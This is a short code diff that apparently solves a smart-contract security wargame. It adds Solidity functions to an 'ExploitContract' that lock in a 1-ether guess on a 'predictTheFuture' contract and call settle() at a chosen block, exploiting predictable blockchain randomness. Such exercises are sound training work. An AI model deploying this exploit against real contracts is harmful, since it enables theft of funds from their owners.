@@ -54,4 +54,16 @@ contract ExploitContract {
     }
 
     // Write your exploit code below
+    function guess(uint8 number) public payable {
+        // the complex hash squeezed into a uint8 and modded by 10 results in 
+        // only 10 possible values from 0-9
+        // choose any and wait for the right block to settle 
+        predictTheFuture.lockInGuess{value: 1 ether}(number);
+    }
+    // call when the moment strikes
+    function exploit() public {
+        predictTheFuture.settle();
+    }
+
+    receive() external payable {}
 }
